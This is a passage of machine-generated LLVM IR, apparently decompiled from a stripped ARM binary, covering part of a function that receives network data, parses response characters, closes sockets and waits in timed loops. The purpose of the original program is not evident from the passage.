  %v3_a3c4 = inttoptr i32 %v2_a3c4 to i32*
  store i32 -1, i32* %v3_a3c4, align 4
  %v0_a3c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a3c8 = trunc i32 %v0_a3c8 to i8
  %v2_a3c8 = load i32, i32* @r8, align 4
  %v3_a3c8 = add i32 %v2_a3c8, -1452
  %v4_a3c8 = inttoptr i32 %v3_a3c8 to i8*
  store i8 %v1_a3c8, i8* %v4_a3c8, align 1
  br label %dec_label_pc_9590

dec_label_pc_a3d0:                                ; preds = %dec_label_pc_a080, %dec_label_pc_a0a4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_a3d8 = call i32 @function_13044(i32 37, i32* null)
  %v0_a3dc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a3dc, i32* @r1, align 4
  store i32 %v3_a3d8, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_a3e8 = call i32 @function_13da8(i8* %tmp199, i32 %v0_a3dc, i32 %v3_a3d8)
  store i32 %v4_a3e8, i32* %r0.global-to-local, align 4
  %v1_a3f0 = add i32 %v4_a3e8, 1
  %v2_a3f0 = icmp eq i32 %v4_a3e8, -1
  store i1 %v2_a3f0, i1* %cpsr_c.global-to-local, align 1
  %v3_a3f0 = sub i32 0, %v4_a3e8
  %v4_a3f0 = and i32 %v1_a3f0, %v3_a3f0
  %v5_a3f0 = icmp slt i32 %v4_a3f0, 0
  store i1 %v5_a3f0, i1* %cpsr_v.global-to-local, align 1
  %v6_a3f0 = icmp slt i32 %v1_a3f0, 0
  store i1 %v6_a3f0, i1* %cpsr_n.global-to-local, align 1
  %v7_a3f0 = icmp eq i32 %v1_a3f0, 0
  store i1 %v7_a3f0, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r5, align 4
  br i1 %v7_a3f0, label %dec_label_pc_a618, label %dec_label_pc_a3fc

dec_label_pc_a3fc:                                ; preds = %dec_label_pc_a3d0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_a404 = call i32 @function_13044(i32 37, i32* null)
  %v0_a408 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a408, i32* @r1, align 4
  store i32 %v3_a404, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_a414 = call i32 @function_13da8(i8* %tmp199, i32 %v0_a408, i32 %v3_a404)
  store i32 %v4_a414, i32* %r0.global-to-local, align 4
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v2_a420 = add i32 %v4_a414, %v2_94a0
  store i32 %v2_a420, i32* %r3.global-to-local, align 4
  %v1_a424 = load i32, i32* @r5, align 4
  %v2_a424 = add i32 %v1_a424, %v2_a420
  %v3_a424 = inttoptr i32 %v2_a424 to i8*
  %v4_a424 = load i8, i8* %v3_a424, align 1
  store i32 %v2_8fd8, i32* %lr.global-to-local, align 4
  %v2_a42c = icmp ugt i8 %v4_a424, 31
  store i1 %v2_a42c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a42c = icmp ult i8 %v4_a424, 32
  store i1 %v6_a42c, i1* %cpsr_n.global-to-local, align 1
  %v7_a42c = icmp eq i8 %v4_a424, 32
  store i1 %v7_a42c, i1* %cpsr_z.global-to-local, align 1
  %v2_a434 = zext i1 %v7_a42c to i32
  %v2_a434.v4_a414 = add i32 %v2_a434, %v4_a414
  store i32 %v2_a434.v4_a414, i32* @r4, align 4
  %v2_a438 = add i32 %v2_a434.v4_a414, %v2_8fd8
  store i32 %v2_a438, i32* @r6, align 4
  store i32 %v2_a438, i32* %r0.global-to-local, align 4
  %v1_a440 = load i32, i32* %fp.global-to-local, align 4
  %v2_a440 = sub i32 %v1_a440, %v2_a434.v4_a414
  store i32 %v2_a440, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_a44c = call i32 @function_13b18(i32 %v2_a438, i32 %v2_a440, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32 2)
  store i32 %v5_a44c, i32* %r0.global-to-local, align 4
  %v1_a450 = add i32 %v5_a44c, 1
  %v2_a450 = icmp eq i32 %v5_a44c, -1
  store i1 %v2_a450, i1* %cpsr_c.global-to-local, align 1
  %v3_a450 = sub i32 0, %v5_a44c
  %v4_a450 = and i32 %v1_a450, %v3_a450
  %v5_a450 = icmp slt i32 %v4_a450, 0
  store i1 %v5_a450, i1* %cpsr_v.global-to-local, align 1
  %v6_a450 = icmp slt i32 %v1_a450, 0
  store i1 %v6_a450, i1* %cpsr_n.global-to-local, align 1
  %v7_a450 = icmp eq i32 %v1_a450, 0
  store i1 %v7_a450, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_a44c, i32* @r7, align 4
  br i1 %v7_a450, label %dec_label_pc_a618, label %dec_label_pc_a45c

dec_label_pc_a45c:                                ; preds = %dec_label_pc_a3fc
  store i32 %v2_94a0, i32* %r1.global-to-local, align 4
  %v1_a464 = load i32, i32* @r4, align 4
  %v2_a464 = add i32 %v1_a464, %v2_94a0
  %v1_a468 = add i32 %v5_a44c, -1
  %v2_a468 = icmp ne i32 %v5_a44c, 0
  store i1 %v2_a468, i1* %cpsr_c.global-to-local, align 1
  %v3_a468 = sub i32 0, %v5_a44c
  %v4_a468 = and i32 %v5_a44c, %v3_a468
  %v5_a468 = icmp slt i32 %v4_a468, 0
  store i1 %v5_a468, i1* %cpsr_v.global-to-local, align 1
  %v6_a468 = icmp slt i32 %v1_a468, 0
  store i1 %v6_a468, i1* %cpsr_n.global-to-local, align 1
  %v7_a468 = icmp eq i32 %v5_a44c, 1
  store i1 %v7_a468, i1* %cpsr_z.global-to-local, align 1
  %v1_a46c = add i32 %v2_a464, -20736
  store i32 %v1_a46c, i32* %r3.global-to-local, align 4
  %v7_a470 = icmp sgt i32 %v5_a44c, 1
  br i1 %v7_a470, label %bb231, label %bb232

bb231:                                            ; preds = %dec_label_pc_a45c
  %v9_a470 = add i32 %v5_a44c, -2
  store i32 %v9_a470, i32* @r7, align 4
  br label %bb232

bb232:                                            ; preds = %dec_label_pc_a45c, %bb231
  %v3_a47c = phi i32 [ %v5_a44c, %dec_label_pc_a45c ], [ %v9_a470, %bb231 ]
  %v1_a474 = add i32 %v2_a464, -20773
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_a47c = add i32 %v1_a474, %v3_a47c
  %v5_a47c = inttoptr i32 %v4_a47c to i8*
  store i8 0, i8* %v5_a47c, align 1
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 %v2_8fd8, i32* %lr.global-to-local, align 4
  %v1_a490 = load i32, i32* @r4, align 4
  %v2_a490 = add i32 %v1_a490, %v2_8fd8
  %v3_a490 = inttoptr i32 %v2_a490 to i8*
  %v4_a490 = load i8, i8* %v3_a490, align 1
  %v6_a490 = zext i8 %v4_a490 to i32
  store i32 %v6_a490, i32* %r0.global-to-local, align 4
  %v1_a494 = add nsw i32 %v6_a490, -48
  store i32 %v1_a494, i32* %r3.global-to-local, align 4
  %v2_a498 = icmp ugt i32 %v1_a494, 8
  store i1 %v2_a498, i1* %cpsr_c.global-to-local, align 1
  %v3_a498 = sub nsw i32 56, %v6_a490
  %v4_a498 = and i32 %v3_a498, %v1_a494
  %v5_a498 = icmp slt i32 %v4_a498, 0
  store i1 %v5_a498, i1* %cpsr_v.global-to-local, align 1
  %v6_a498 = icmp ult i8 %v4_a490, 57
  store i1 %v6_a498, i1* %cpsr_n.global-to-local, align 1
  %v7_a498 = icmp eq i32 %v1_a494, 9
  store i1 %v7_a498, i1* %cpsr_z.global-to-local, align 1
  %v2_a49c = xor i1 %v7_a498, true
  %v3_a49c = and i1 %v2_a498, %v2_a49c
  br i1 %v3_a49c, label %.thread142, label %dec_label_pc_a4a4

.thread142:                                       ; preds = %bb232
  %v4_a49c = load i32, i32* @r6, align 4
  br label %dec_label_pc_a4cc

dec_label_pc_a4a4:                                ; preds = %bb232
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_a4b4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_a4a8

dec_label_pc_a4a8:                                ; preds = %dec_label_pc_a4a8, %dec_label_pc_a4a4
  %v0_a4a8 = phi i32 [ %v1_a4a8, %dec_label_pc_a4a8 ], [ 0, %dec_label_pc_a4a4 ]
  %v1_a4a8 = add i32 %v0_a4a8, 1
  store i32 %v1_a4a8, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  store i32 %v1_a4a8, i32* %stack_var_-40, align 4
  %v2_a4b4 = add i32 %v1_a4a8, %v1_a4b4.pre
  %v3_a4b4 = inttoptr i32 %v2_a4b4 to i8*
  %v4_a4b4 = load i8, i8* %v3_a4b4, align 1
  %v6_a4b4 = zext i8 %v4_a4b4 to i32
  store i32 %v6_a4b4, i32* %r0.global-to-local, align 4
  %v1_a4b8 = add nsw i32 %v6_a4b4, -48
  %v2_a4bc = icmp ugt i32 %v1_a4b8, 8
  store i1 %v2_a4bc, i1* %cpsr_c.global-to-local, align 1
  %v3_a4bc = sub nsw i32 56, %v6_a4b4
  %v4_a4bc = and i32 %v3_a4bc, %v1_a4b8
  %v5_a4bc = icmp slt i32 %v4_a4bc, 0
  store i1 %v5_a4bc, i1* %cpsr_v.global-to-local, align 1
  %v6_a4bc = icmp ult i8 %v4_a4b4, 57
  store i1 %v6_a4bc, i1* %cpsr_n.global-to-local, align 1
  %v7_a4bc = icmp eq i32 %v1_a4b8, 9
  store i1 %v7_a4bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a4a8, i32* %r3.global-to-local, align 4
  %v2_a4c4 = xor i1 %v2_a4bc, true
  %v3_a4c4 = or i1 %v7_a4bc, %v2_a4c4
  br i1 %v3_a4c4, label %dec_label_pc_a4a8, label %dec_label_pc_a4cc

dec_label_pc_a4cc:                                ; preds = %dec_label_pc_a4a8, %.thread142
  %v2_a4d8 = phi i32 [ %v4_a49c, %.thread142 ], [ %v2_a4b4, %dec_label_pc_a4a8 ]
  %v0_a4cc = phi i32 [ %v6_a490, %.thread142 ], [ %v6_a4b4, %dec_label_pc_a4a8 ]
  store i32 %v2_a4d8, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a4cc = icmp eq i32 %v0_a4cc, 0
  store i1 %v2_a4cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a4cc, label %dec_label_pc_a618, label %dec_label_pc_a4d4

dec_label_pc_a4d4:                                ; preds = %dec_label_pc_a4cc
  store i32 0, i32* @r5, align 4
  %v3_a4d8 = inttoptr i32 %v2_a4d8 to i8*
  store i8 0, i8* %v3_a4d8, align 1
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v3_a4e0 = load i32, i32* %stack_var_-40, align 4
  %v1_a4e4 = add i32 %v3_a4e0, 1
  store i32 %v1_a4e4, i32* %ip.global-to-local, align 4
  store i32 %v1_a4e4, i32* %stack_var_-40, align 4
  %v0_a4ec = load i32, i32* @r6, align 4
  %v2_a4ec = add i32 %v0_a4ec, %v1_a4e4
  %v3_a4ec = inttoptr i32 %v2_a4ec to i8*
  %v4_a4ec = load i8, i8* %v3_a4ec, align 1
  %v6_a4ec = zext i8 %v4_a4ec to i32
  store i32 %v6_a4ec, i32* %r3.global-to-local, align 4
  %v2_a4f0 = icmp ugt i8 %v4_a4ec, 31
  store i1 %v2_a4f0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a4f0 = icmp ult i8 %v4_a4ec, 32
  store i1 %v6_a4f0, i1* %cpsr_n.global-to-local, align 1
  %v7_a4f0 = icmp eq i8 %v4_a4ec, 32
  store i1 %v7_a4f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a4f0, label %bb233, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_a4d4
  store i32 %v2_a4ec, i32* @r4, align 4
  br label %bb234

bb233:                                            ; preds = %dec_label_pc_a4d4
  %v2_a4f4 = add i32 %v3_a4e0, 2
  store i32 %v2_a4f4, i32* %ip.global-to-local, align 4
  %v2_a4f8 = add i32 %v0_a4ec, %v2_a4f4
  store i32 %v2_a4f8, i32* @r4, align 4
  store i32 %v2_a4f4, i32* %stack_var_-40, align 4
  br label %bb234

bb234:                                            ; preds = %.thread56, %bb233
  %v0_a500 = phi i32 [ %v2_a4ec, %.thread56 ], [ %v2_a4f8, %bb233 ]
  store i32 %v0_a500, i32* %r0.global-to-local, align 4
  %v1_a504 = inttoptr i32 %v0_a500 to i8*
  %v2_a504 = call i32 @function_13a54(i8* %v1_a504)
  store i32 ptrtoint ([5 x i8]* @global_var_143e0.101 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a504, i32* @r1, align 4
  %v0_a510 = load i32, i32* @r4, align 4
  store i32 %v0_a510, i32* %r0.global-to-local, align 4
  %v4_a514 = inttoptr i32 %v0_a510 to i8*
  %v5_a514 = call i32 @function_13da8(i8* %v4_a514, i32 %v2_a504, i32 ptrtoint ([5 x i8]* @global_var_143e0.101 to i32))
  store i32 %v5_a514, i32* %r0.global-to-local, align 4
  %v1_a518 = add i32 %v5_a514, 1
  %v2_a518 = icmp eq i32 %v5_a514, -1
  store i1 %v2_a518, i1* %cpsr_c.global-to-local, align 1
  %v3_a518 = sub i32 0, %v5_a514
  %v4_a518 = and i32 %v1_a518, %v3_a518
  %v5_a518 = icmp slt i32 %v4_a518, 0
  store i1 %v5_a518, i1* %cpsr_v.global-to-local, align 1
  %v6_a518 = icmp slt i32 %v1_a518, 0
  store i1 %v6_a518, i1* %cpsr_n.global-to-local, align 1
  %v7_a518 = icmp eq i32 %v1_a518, 0
  store i1 %v7_a518, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a518, label %.thread60, label %dec_label_pc_a528

.thread60:                                        ; preds = %bb234
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v4_a520 = load i32, i32* %v11_904c, align 4
  store i32 %v4_a520, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a55c

dec_label_pc_a528:                                ; preds = %bb234
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  %v3_a52c = load i32, i32* %stack_var_-40, align 4
  %v0_a530 = load i32, i32* @r6, align 4
  %v2_a530 = add i32 %v0_a530, %v3_a52c
  store i32 %v2_a530, i32* @r4, align 4
  store i32 %v2_a530, i32* %r0.global-to-local, align 4
  %v1_a538 = inttoptr i32 %v2_a530 to i8*
  %v2_a538 = call i32 @function_13a54(i8* %v1_a538)
  store i32 ptrtoint ([5 x i8]* @global_var_143e0.101 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a538, i32* @r1, align 4
  %v0_a544 = load i32, i32* @r4, align 4
  store i32 %v0_a544, i32* %r0.global-to-local, align 4
  %v4_a548 = inttoptr i32 %v0_a544 to i8*
  %v5_a548 = call i32 @function_13da8(i8* %v4_a548, i32 %v2_a538, i32 ptrtoint ([5 x i8]* @global_var_143e0.101 to i32))
  store i32 %v5_a548, i32* %r0.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v3_a550 = load i32, i32* %stack_var_-40, align 4
  %v2_a554 = add i32 %v3_a550, %v5_a548
  store i32 %v2_a554, i32* %ip.global-to-local, align 4
  store i32 %v2_a554, i32* %stack_var_-40, align 4
  br label %dec_label_pc_a55c

dec_label_pc_a55c:                                ; preds = %.thread60, %dec_label_pc_a528
  %v0_aae4 = phi i32 [ %v4_a520, %.thread60 ], [ %v2_a554, %dec_label_pc_a528 ]
  %v0_a55c = load i32, i32* @r6, align 4
  %v2_a55c = add i32 %v0_a55c, %v0_aae4
  %v3_a55c = inttoptr i32 %v2_a55c to i8*
  %v4_a55c = load i8, i8* %v3_a55c, align 1
  %v6_a55c = zext i8 %v4_a55c to i32
  store i32 %v6_a55c, i32* %r3.global-to-local, align 4
  %v2_a560 = icmp ugt i8 %v4_a55c, 33
  store i1 %v2_a560, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a560 = icmp ult i8 %v4_a55c, 34
  store i1 %v6_a560, i1* %cpsr_n.global-to-local, align 1
  %v7_a560 = icmp eq i8 %v4_a55c, 34
  store i1 %v7_a560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a560, label %dec_label_pc_aae4, label %dec_label_pc_a568

dec_label_pc_a568:                                ; preds = %dec_label_pc_aae4, %dec_label_pc_a55c, %dec_label_pc_ab0c
  %v0_a568 = load i32, i32* @r6, align 4
  store i32 %v0_a568, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_a570 = inttoptr i32 %v0_a568 to i8*
  %v3_a570 = call i32 @function_13b80(i8* %v2_a570, i32 10)
  store i32 %v3_a570, i32* %r0.global-to-local, align 4
  %v1_a574 = add i32 %v3_a570, -1
  store i32 %v1_a574, i32* %r3.global-to-local, align 4
  %v1_a578 = add i32 %v3_a570, -9
  %v2_a578 = icmp ugt i32 %v1_a574, 7
  store i1 %v2_a578, i1* %cpsr_c.global-to-local, align 1
  %v3_a578 = sub i32 8, %v3_a570
  %v4_a578 = and i32 %v3_a578, %v1_a574
  %v5_a578 = icmp slt i32 %v4_a578, 0
  store i1 %v5_a578, i1* %cpsr_v.global-to-local, align 1
  %v6_a578 = icmp slt i32 %v1_a578, 0
  store i1 %v6_a578, i1* %cpsr_n.global-to-local, align 1
  %v7_a578 = icmp eq i32 %v1_a574, 8
  store i1 %v7_a578, i1* %cpsr_z.global-to-local, align 1
  %v2_a57c = xor i1 %v2_a578, true
  %v3_a57c = or i1 %v7_a578, %v2_a57c
  br i1 %v3_a57c, label %dec_label_pc_a590.preheader, label %dec_label_pc_a5a4

dec_label_pc_a590.preheader:                      ; preds = %dec_label_pc_a568
  store i32 %v2_9530, i32* %ip.global-to-local, align 4
  %v6_a580 = add i32 %v3_a570, %v2_9530
  store i32 %v6_a580, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a590

dec_label_pc_a58c:                                ; preds = %dec_label_pc_a590
  %v1_a58c = call i32 @_sleep(i32 1)
  store i32 %v1_a58c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a590

dec_label_pc_a590:                                ; preds = %dec_label_pc_a590.preheader, %dec_label_pc_a58c
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_a594 = call i32 @time(i32* null)
  %v1_a598 = load i32, i32* %r4.global-to-local, align 4
  %v2_a598 = sub i32 %v2_a594, %v1_a598
  %v3_a598 = icmp uge i32 %v2_a594, %v1_a598
  store i1 %v3_a598, i1* %cpsr_c.global-to-local, align 1
  %v4_a598 = xor i32 %v1_a598, %v2_a594
  %v5_a598 = xor i32 %v2_a598, %v2_a594
  %v6_a598 = and i32 %v5_a598, %v4_a598
  %v7_a598 = icmp slt i32 %v6_a598, 0
  store i1 %v7_a598, i1* %cpsr_v.global-to-local, align 1
  %v8_a598 = icmp slt i32 %v2_a598, 0
  store i1 %v8_a598, i1* %cpsr_n.global-to-local, align 1
  %v9_a598 = icmp eq i32 %v2_a594, %v1_a598
  store i1 %v9_a598, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  br i1 %v3_a598, label %dec_label_pc_a5a4, label %dec_label_pc_a58c

dec_label_pc_a5a4:                                ; preds = %dec_label_pc_a590, %dec_label_pc_a568
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v3_a5a8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a5a8, i32* @r4, align 4
  %v0_a5ac = load i32, i32* @r6, align 4
  %v2_a5ac = add i32 %v0_a5ac, %v3_a5a8
  store i32 %v2_a5ac, i32* @r5, align 4
  store i32 %v2_a5ac, i32* %r0.global-to-local, align 4
  %v1_a5b4 = inttoptr i32 %v2_a5ac to i8*
  %v2_a5b4 = call i32 @function_13a54(i8* %v1_a5b4)
  store i32 ptrtoint ([5 x i8]* @global_var_143d8.99 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a5b4, i32* @r1, align 4
  %v0_a5c0 = load i32, i32* @r5, align 4
  store i32 %v0_a5c0, i32* %r0.global-to-local, align 4
  %v4_a5c4 = inttoptr i32 %v0_a5c0 to i8*
  %v5_a5c4 = call i32 @function_13da8(i8* %v4_a5c4, i32 %v2_a5b4, i32 ptrtoint ([5 x i8]* @global_var_143d8.99 to i32))
  store i32 %v5_a5c4, i32* %r0.global-to-local, align 4
  %v1_a5c8 = add i32 %v5_a5c4, -4
  %v2_a5c8 = icmp ugt i32 %v5_a5c4, 3
  store i1 %v2_a5c8, i1* %cpsr_c.global-to-local, align 1
  %v3_a5c8 = sub i32 3, %v5_a5c4
  %v4_a5c8 = and i32 %v3_a5c8, %v5_a5c4
  %v5_a5c8 = icmp slt i32 %v4_a5c8, 0
  store i1 %v5_a5c8, i1* %cpsr_v.global-to-local, align 1
  %v6_a5c8 = icmp slt i32 %v1_a5c8, 0
  store i1 %v6_a5c8, i1* %cpsr_n.global-to-local, align 1
  %v7_a5c8 = icmp eq i32 %v5_a5c4, 4
  store i1 %v7_a5c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a5c8, label %dec_label_pc_a9c0, label %dec_label_pc_a5d0

dec_label_pc_a5d0:                                ; preds = %dec_label_pc_a5a4
  %v0_a5d0 = load i32, i32* @r6, align 4
  %v1_a5d0 = load i32, i32* @r4, align 4
  %v2_a5d0 = add i32 %v1_a5d0, %v0_a5d0
  %v3_a5d0 = inttoptr i32 %v2_a5d0 to i8*
  %v4_a5d0 = load i8, i8* %v3_a5d0, align 1
  %v6_a5d0 = zext i8 %v4_a5d0 to i32
  store i32 %v6_a5d0, i32* %r3.global-to-local, align 4
  %v2_a5d4 = icmp ugt i8 %v4_a5d0, 46
  store i1 %v2_a5d4, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a5d4 = icmp ult i8 %v4_a5d0, 47
  store i1 %v6_a5d4, i1* %cpsr_n.global-to-local, align 1
  %v7_a5d4 = icmp eq i8 %v4_a5d0, 47
  store i1 %v7_a5d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a5d4, label %dec_label_pc_ab38, label %dec_label_pc_a5dc

dec_label_pc_a5dc:                                ; preds = %dec_label_pc_ab54, %dec_label_pc_ab38, %dec_label_pc_aa90, %dec_label_pc_aa74, %dec_label_pc_a5d0, %dec_label_pc_ab84, %dec_label_pc_aac0
  %v0_a5dc = load i32, i32* %sb.global-to-local, align 4
  %v1_a5e0 = add i32 %v0_a5dc, 1431
  store i32 %v1_a5e0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_143b4.76 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_a5ec = call i32 @_memcpy(i32 %v1_a5e0, i32 ptrtoint ([4 x i8]* @global_var_143b4.76 to i32), i32 4)
  store i32 %v4_a5ec, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_a5f4 = load i32, i32* @r8, align 4
  %v3_a5f4 = add i32 %v2_a5f4, -1452
  %v4_a5f4 = inttoptr i32 %v3_a5f4 to i8*
  store i8 10, i8* %v4_a5f4, align 1
  br label %dec_label_pc_9590

dec_label_pc_a5fc:                                ; preds = %dec_label_pc_9368
  store i32 %v1_9368, i32* %r3.global-to-local, align 4
  %v1_a600 = trunc i32 %v1_9368 to i8
  store i8 %v1_a600, i8* %v2_93a8, align 1
  %v0_a604 = load i32, i32* @r6, align 4
  %v1_a604 = add i32 %v0_a604, -1431
  %v2_a604 = inttoptr i32 %v1_a604 to i32*
  %v3_a604 = load i32, i32* %v2_a604, align 4
  store i32 %v3_a604, i32* %r0.global-to-local, align 4
  %v1_a608 = call i32 @close(i32 %v3_a604)
  store i32 %v1_a608, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_a610 = load i32, i32* @r6, align 4
  %v2_a610 = add i32 %v1_a610, -1431
  %v3_a610 = inttoptr i32 %v2_a610 to i32*
  store i32 -1, i32* %v3_a610, align 4
  br label %dec_label_pc_9388

dec_label_pc_a618:                                ; preds = %dec_label_pc_a4cc, %dec_label_pc_a3fc, %dec_label_pc_a3d0
  %v0_a618 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a618, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_143cc.95 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v5_a628 = call i32 @function_13b18(i32 %v2_8fd8, i32 %v0_a618, i32 ptrtoint ([5 x i8]* @global_var_143cc.95 to i32), i32 4)
  %v0_a62c = load i32, i32* %sb.global-to-local, align 4
  %v1_a630 = add i32 %v0_a62c, 1431
  store i32 %v1_a630, i32* @r4, align 4
  store i32 %v5_a628, i32* @r5, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_143e8.103 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_a630, i32* %r0.global-to-local, align 4
  %v3_a640 = inttoptr i32 %v1_a630 to i8*
  %v4_a640 = call i32 @function_13e34(i8* %v3_a640, i32 ptrtoint ([5 x i8]* @global_var_143e8.103 to i32))
  store i32 %v4_a640, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a644 = icmp slt i32 %v4_a640, 0
  store i1 %v1_a644, i1* %cpsr_n.global-to-local, align 1
  %v2_a644 = icmp eq i32 %v4_a640, 0
  store i1 %v2_a644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a644, label %dec_label_pc_a800, label %dec_label_pc_a64c

dec_label_pc_a64c:                                ; preds = %dec_label_pc_a800, %dec_label_pc_a618
  store i32 7, i32* %r3.global-to-local, align 4
  %v2_a650 = load i32, i32* @r8, align 4
  %v3_a650 = add i32 %v2_a650, -1452
  %v4_a650 = inttoptr i32 %v3_a650 to i8*
  store i8 7, i8* %v4_a650, align 1
  br label %dec_label_pc_a654

dec_label_pc_a654:                                ; preds = %bb240, %dec_label_pc_a64c
  %v0_a654 = load i32, i32* @r5, align 4
  store i32 %v0_a654, i32* %r2.global-to-local, align 4
  %v0_a658 = load i32, i32* @r8, align 4
  %v1_a658 = add i32 %v0_a658, -1456
  %v2_a658 = inttoptr i32 %v1_a658 to i32*
  %v3_a658 = load i32, i32* %v2_a658, align 4
  store i32 %v3_a658, i32* %r0.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_a664 = call i32 @_recv(i32 %v3_a658, i32 %v2_8fd8, i32 %v0_a654, i32 16384)
  store i32 %v4_a664, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9590

dec_label_pc_a66c:                                ; preds = %dec_label_pc_9b5c
  %v2_a66c = add i32 %v0_a66c, -10240
  %v3_a66c = icmp ugt i32 %v0_a66c, 10239
  store i1 %v3_a66c, i1* %cpsr_c.global-to-local, align 1
  %v4_a66c = sub i32 10239, %v0_a66c
  %v5_a66c = and i32 %v4_a66c, %v0_a66c
  %v6_a66c = icmp slt i32 %v5_a66c, 0
  store i1 %v6_a66c, i1* %cpsr_v.global-to-local, align 1
  %v7_a66c = icmp slt i32 %v2_a66c, 0
  store i1 %v7_a66c, i1* %cpsr_n.global-to-local, align 1
  %v8_a66c = icmp eq i32 %v0_a66c, 10240
  store i1 %v8_a66c, i1* %cpsr_z.global-to-local, align 1
  %v5_a670 = icmp slt i32 %v0_a66c, 10240
  br i1 %v5_a670, label %dec_label_pc_9590, label %dec_label_pc_9b78

dec_label_pc_a678:                                ; preds = %dec_label_pc_a380
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_a67c = load i32, i32* @r4, align 4
  %v2_a67c = inttoptr i32 %v1_a67c to i32*
  store i32 104, i32* %v2_a67c, align 4
  br label %dec_label_pc_a3b4

dec_label_pc_a684:                                ; preds = %dec_label_pc_a188
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_a688 = load i32, i32* %fp.global-to-local, align 4
  %v2_a688 = inttoptr i32 %v1_a688 to i32*
  store i32 104, i32* %v2_a688, align 4
  br label %dec_label_pc_a68c

dec_label_pc_a68c:                                ; preds = %dec_label_pc_a6a8, %dec_label_pc_a684
  %v0_a68c = load i32, i32* @r8, align 4
  %v1_a68c = add i32 %v0_a68c, -1456
  %v2_a68c = inttoptr i32 %v1_a68c to i32*
  %v3_a68c = load i32, i32* %v2_a68c, align 4
  store i32 %v3_a68c, i32* %r0.global-to-local, align 4
  %v1_a690 = call i32 @close(i32 %v3_a68c)
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_a69c = load i32, i32* @r8, align 4
  %v2_a69c = add i32 %v1_a69c, -1456
  %v3_a69c = inttoptr i32 %v2_a69c to i32*
  store i32 -1, i32* %v3_a69c, align 4
  %v0_a6a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_a6a0 = trunc i32 %v0_a6a0 to i8
